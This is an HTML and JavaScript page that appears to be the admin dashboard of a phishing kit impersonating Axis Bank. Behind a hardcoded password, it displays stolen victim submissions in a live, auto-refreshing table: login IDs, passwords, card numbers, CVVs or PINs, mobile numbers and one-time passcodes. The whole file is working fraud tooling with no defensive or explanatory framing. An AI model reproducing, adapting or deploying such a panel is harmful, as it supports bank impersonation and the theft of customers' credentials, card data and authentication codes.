<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Axis Bank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: #0f0f1a;
            min-height: 100vh;
            overflow-x: hidden;
            color: white;
        }
        
        /* Password Login */
        .login-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #87103F 0%, #2c0b0e 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .login-box {
            background: rgba(0, 0, 0, 0.6);
            padding: 40px;
            border-radius: 15px;
            width: 90%;
            max-width: 400px;
            border: 2px solid #87103F;
            box-shadow: 0 10px 30px rgba(135, 16, 63, 0.4);
        }
        
        .login-title {
            color: white;
            text-align: center;
            font-size: 28px;
            margin-bottom: 25px;
            text-shadow: 0 2px 10px rgba(255, 255, 255, 0.2);
        }
        
        .login-input {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            border: 2px solid #87103F;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.05);
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        
        .login-input:focus {
            outline: none;
            border-color: #ff4757;
            box-shadow: 0 0 15px rgba(255, 71, 87, 0.3);
            background: rgba(255, 255, 255, 0.1);
        }
        
        .login-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        
        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #87103F 0%, #a0144a 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            letter-spacing: 1px;
        }
        
        .login-btn:hover {
            background: linear-gradient(135deg, #a0144a 0%, #87103F 100%);
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(135, 16, 63, 0.6);
        }
        
        .login-error {
            color: #ff4757;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            display: none;
            animation: shake 0.5s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        /* Admin Panel */
        .admin-panel {
            display: none;
            padding: 10px;
            max-width: 1400px;
            margin: 0 auto;
            animation: pageBlink 5s infinite;
        }
        
        @keyframes pageBlink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.98; }
        }
        
        /* Header */
        .panel-header {
            background: linear-gradient(135deg, #87103F 0%, #2c0b0e 100%);
            color: white;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 10px;
            border: 1px solid #87103F;
            animation: headerBlink 5s infinite;
        }
        
        @keyframes headerBlink {
            0%, 100% { box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); }
            50% { box-shadow: 0 5px 15px rgba(255, 71, 87, 0.3); }
        }
        
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .header-title {
            font-size: 20px;
            font-weight: bold;
        }
        
        .stats-container {
            display: flex;
            gap: 10px;
        }
        
        .stat-box {
            background: rgba(255, 255, 255, 0.1);
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 13px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .stat-value {
            color: #ff4757;
            font-weight: bold;
            margin-left: 5px;
        }
        
        .refresh-info {
            text-align: center;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.8);
            padding-top: 10px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .blink-dot {
            width: 8px;
            height: 8px;
            background: #00ff00;
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
            animation: blink 1s infinite;
            box-shadow: 0 0 10px #00ff00;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        /* Submissions Container - White Background */
        .submissions-container {
            background: white;
            border-radius: 10px;
            padding: 15px;
            border: 1px solid #87103F;
            max-height: 75vh;
            overflow-y: auto;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .submissions-header {
            display: grid;
            grid-template-columns: 50px 100px 200px 150px 150px 150px 150px 100px;
            padding: 12px;
            background: linear-gradient(135deg, #87103F 0%, #a0144a 100%);
            border-radius: 8px;
            margin-bottom: 10px;
            font-weight: bold;
            font-size: 12px;
            color: white;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        .submission-item {
            display: grid;
            grid-template-columns: 50px 100px 200px 150px 150px 150px 150px 100px;
            padding: 12px;
            margin-bottom: 8px;
            background: #f8f9fa;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
            transition: all 0.3s ease;
            font-size: 12px;
            color: #333;
            animation: highlightEntry 0.5s ease-out;
        }
        
        @keyframes highlightEntry {
            0% { background: rgba(135, 16, 63, 0.3); }
            100% { background: #f8f9fa; }
        }
        
        .submission-item.new {
            background: #fff3cd !important;
            border: 1px solid #ffc107 !important;
            animation: newBlink 5s infinite;
        }
        
        @keyframes newBlink {
            0%, 100% { 
                background: #fff3cd !important;
                border-color: #ffc107 !important;
            }
            50% { 
                background: #fffbeb !important;
                border-color: #f59e0b !important;
            }
        }
        
        .submission-item:hover {
            background: #e9ecef;
            transform: translateY(-1px);
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .submission-id {
            color: #87103F;
            font-weight: bold;
            font-size: 11px;
        }
        
        .submission-type {
            text-transform: uppercase;
            font-weight: bold;
            padding: 3px 6px;
            border-radius: 4px;
            display: inline-block;
            text-align: center;
            font-size: 11px;
        }
        
        .type-login {
            background: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #4CAF50;
        }
        
        .type-credit {
            background: #e3f2fd;
            color: #1565c0;
            border: 1px solid #2196F3;
        }
        
        .type-otp {
            background: #fff8e1;
            color: #ff8f00;
            border: 1px solid #FFC107;
        }
        
        .submission-field {
            padding: 2px 0;
        }
        
        .field-label {
            color: #666;
            font-size: 10px;
            margin-bottom: 2px;
        }
        
        .field-value {
            color: #222;
            font-weight: 500;
            word-break: break-all;
            font-size: 12px;
        }
        
        .field-value.password {
            color: #dc3545;
            font-weight: bold;
            background: #f8d7da;
            padding: 1px 5px;
            border-radius: 3px;
            display: inline-block;
        }
        
        .field-value.otp {
            color: #87103F;
            font-weight: bold;
            background: #ffebee;
            padding: 1px 5px;
            border-radius: 3px;
            display: inline-block;
            animation: otpBlink 2s infinite;
            font-size: 14px;
        }
        
        @keyframes otpBlink {
            0%, 100% { background: #ffebee; }
            50% { background: #ffcdd2; }
        }
        
        .submission-time {
            color: #666;
            font-size: 11px;
        }
        
        .submission-ip {
            color: #666;
            font-size: 10px;
            font-family: monospace;
        }
        
        .no-data {
            text-align: center;
            padding: 40px;
            color: #666;
            font-style: italic;
            grid-column: 1 / -1;
            background: white;
            border-radius: 8px;
            border: 2px dashed #ddd;
        }
        
        /* Responsive */
        @media (max-width: 1200px) {
            .submissions-header,
            .submission-item {
                grid-template-columns: 50px 80px 150px 130px 130px 130px 130px 80px;
                font-size: 11px;
            }
        }
        
        @media (max-width: 992px) {
            .submissions-container {
                overflow-x: auto;
            }
            
            .submissions-header,
            .submission-item {
                grid-template-columns: 50px 80px 180px 140px 140px 140px 140px 80px;
                width: 1200px;
            }
        }
        
        @media (max-width: 768px) {
            .admin-panel {
                padding: 5px;
            }
            
            .header-top {
                flex-direction: column;
                gap: 10px;
                text-align: center;
            }
            
            .stats-container {
                justify-content: center;
                flex-wrap: wrap;
            }
        }
        
        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.1);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #87103F;
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #a0144a;
        }
        
        /* Remove all buttons */
        .controls,
        .control-btn,
        .modal-overlay,
        .modal-content,
        .modal-close {
            display: none !important;
        }
    </style>
</head>
<body>
    <!-- Password Login Screen -->
    <div class="login-screen" id="loginScreen">
        <div class="login-box">
            <div class="login-title">üîê ADMIN PANEL</div>
            <input type="text" id="username" class="login-input" placeholder="Admin User ID" autocomplete="off">
            <input type="password" id="password" class="login-input" placeholder="Password" autocomplete="off">
            <button class="login-btn" onclick="login()">ENTER ADMIN PANEL</button>
            <div class="login-error" id="loginError">‚ö†Ô∏è Invalid credentials</div>
        </div>
    </div>
    
    <!-- Admin Panel -->
    <div class="admin-panel" id="adminPanel">
        <!-- Header -->
        <div class="panel-header">
            <div class="header-top">
                <div class="header-title">üìä AXIS BANK SUBMISSIONS - LIVE VIEW</div>
                <div class="stats-container">
                    <div class="stat-box">Total: <span class="stat-value" id="totalCount">0</span></div>
                    <div class="stat-box">Today: <span class="stat-value" id="todayCount">0</span></div>
                    <div class="stat-box">New: <span class="stat-value" id="newCount">0</span></div>
                </div>
            </div>
            <div class="refresh-info">
                <span class="blink-dot"></span>
                Auto-refresh in: <span id="refreshTimer">5</span> seconds
            </div>
        </div>
        
        <!-- Submissions List -->
        <div class="submissions-container">
            <div class="submissions-header">
                <div>ID</div>
                <div>Type</div>
                <div>User ID/Email</div>
                <div>Password</div>
                <div>Mobile</div>
                <div>Card/Details</div>
                <div>OTP</div>
                <div>Time</div>
            </div>
            <div id="submissionsList">
                <div class="no-data">No submissions yet. Waiting for data...</div>
            </div>
        </div>
    </div>

    <script>
        // Admin Credentials
        const ADMIN_USER = "admin";
        const ADMIN_PASS = "18322387";
        
        let refreshInterval;
        let refreshTimer = 5;
        let currentSubmissions = [];
        
        // Check login on load
        document.addEventListener('DOMContentLoaded', function() {
            const savedLogin = localStorage.getItem('axisAdminLoggedIn');
            if (savedLogin === 'true') {
                showAdminPanel();
            }
            
            // Enter key login
            document.getElementById('password').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') login();
            });
            
            document.getElementById('username').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') login();
            });
        });
        
        // Login function
        function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (username === ADMIN_USER && password === ADMIN_PASS) {
                localStorage.setItem('axisAdminLoggedIn', 'true');
                showAdminPanel();
            } else {
                const errorEl = document.getElementById('loginError');
                errorEl.style.display = 'block';
                errorEl.textContent = '‚ùå Invalid credentials! Try again.';
                setTimeout(() => errorEl.style.display = 'none', 3000);
                
                errorEl.style.animation = 'none';
                setTimeout(() => {
                    errorEl.style.animation = 'shake 0.5s ease';
                }, 10);
            }
        }
        
        // Show admin panel
        function showAdminPanel() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            refreshData();
            startAutoRefresh();
        }
        
        // Start auto refresh every 5 seconds
        function startAutoRefresh() {
            clearInterval(refreshInterval);
            refreshInterval = setInterval(() => {
                refreshTimer--;
                document.getElementById('refreshTimer').textContent = refreshTimer;
                
                if (refreshTimer <= 0) {
                    refreshData();
                    refreshTimer = 5;
                }
            }, 1000);
        }
        
        // Refresh data
        function refreshData() {
            const submissions = loadSubmissions();
            displaySubmissions(submissions);
            updateStats(submissions);
            refreshTimer = 5;
        }
        
        // Load submissions from localStorage
        function loadSubmissions() {
            try {
                const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions')) || [];
                currentSubmissions = submissions;
                return submissions;
            } catch (error) {
                console.error('‚ùå Error loading submissions:', error);
                return [];
            }
        }
        
        // Update statistics
        function updateStats(submissions) {
            const total = submissions.length;
            
            const today = new Date().toDateString();
            const todayCount = submissions.filter(sub => {
                const subDate = new Date(sub.timestamp || sub.date).toDateString();
                return subDate === today;
            }).length;
            
            const newCount = submissions.filter(sub => {
                const subTime = new Date(sub.timestamp || sub.date).getTime();
                return (Date.now() - subTime) < 5 * 60 * 1000;
            }).length;
            
            document.getElementById('totalCount').textContent = total;
            document.getElementById('todayCount').textContent = todayCount;
            document.getElementById('newCount').textContent = newCount;
        }
        
        // Display submissions
        function displaySubmissions(submissions) {
            const container = document.getElementById('submissionsList');
            
            if (!submissions || submissions.length === 0) {
                container.innerHTML = '<div class="no-data">No submissions found in database</div>';
                return;
            }
            
            // Sort by timestamp (newest first)
            submissions.sort((a, b) => {
                const timeA = a.timestamp ? new Date(a.timestamp).getTime() : 0;
                const timeB = b.timestamp ? new Date(b.timestamp).getTime() : 0;
                return timeB - timeA;
            });
            
            let html = '';
            
            submissions.forEach((sub, index) => {
                const subId = sub.id || `SUB${index + 1}`;
                const subType = sub.type || 'unknown';
                const timeString = formatTime(sub.timestamp || sub.date);
                const isNew = sub.timestamp ? 
                    (Date.now() - new Date(sub.timestamp).getTime()) < 5 * 60 * 1000 : 
                    false;
                
                const typeClass = `type-${subType}`;
                
                // Get data fields based on submission type
                let userId = '', password = '', mobile = '', card = '', otp = '';
                
                if (sub.data) {
                    // Login type
                    if (sub.type === 'login') {
                        userId = sub.data.loginId || sub.data.email || sub.data.userId || '';
                        password = sub.data.password || sub.data.pass || '';
                        mobile = sub.data.mobile || sub.data.phone || '';
                    }
                    // Credit card type
                    else if (sub.type === 'credit') {
                        userId = sub.data.name || sub.data.cardName || '';
                        password = sub.data.cvv || sub.data.pin || '';
                        mobile = sub.data.mobile || sub.data.cardMobile || '';
                        card = sub.data.cardNumber ? formatCardNumber(sub.data.cardNumber) : '';
                    }
                    // OTP type
                    else if (sub.type === 'otp') {
                        mobile = sub.data.mobileNumber || sub.data.mobile || '';
                        otp = sub.data.otp || '';
                    }
                }
                
                html += `
                    <div class="submission-item ${isNew ? 'new' : ''}">
                        <div class="submission-id">${subId}</div>
                        <div class="submission-type ${typeClass}">${subType}</div>
                        <div class="submission-field">
                            <div class="field-label">ID/Email</div>
                            <div class="field-value">${userId || 'N/A'}</div>
                        </div>
                        <div class="submission-field">
                            <div class="field-label">Password/CVV</div>
                            <div class="field-value password">${password || 'N/A'}</div>
                        </div>
                        <div class="submission-field">
                            <div class="field-label">Mobile</div>
                            <div class="field-value">${mobile || 'N/A'}</div>
                        </div>
                        <div class="submission-field">
                            <div class="field-label">Card/Details</div>
                            <div class="field-value">${card || 'N/A'}</div>
                        </div>
                        <div class="submission-field">
                            <div class="field-label">OTP</div>
                            <div class="field-value otp">${otp || 'N/A'}</div>
                        </div>
                        <div class="submission-time">${timeString}</div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        // Format card number
        function formatCardNumber(cardNumber) {
            if (!cardNumber) return '';
            const cleaned = cardNumber.toString().replace(/\D/g, '');
            if (cleaned.length <= 4) return cleaned;
            return `****-****-****-${cleaned.slice(-4)}`;
        }
        
        // Format time
        function formatTime(timestamp) {
            if (!timestamp) return 'N/A';
            
            try {
                const date = new Date(timestamp);
                return date.toLocaleString('en-IN', {
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit',
                    day: '2-digit',
                    month: 'short'
                });
            } catch (e) {
                return timestamp;
            }
        }
        
        // Auto-logout after 60 minutes
        setTimeout(() => {
            localStorage.removeItem('axisAdminLoggedIn');
            location.reload();
        }, 60 * 60 * 1000);
    </script>
</body>
</html>
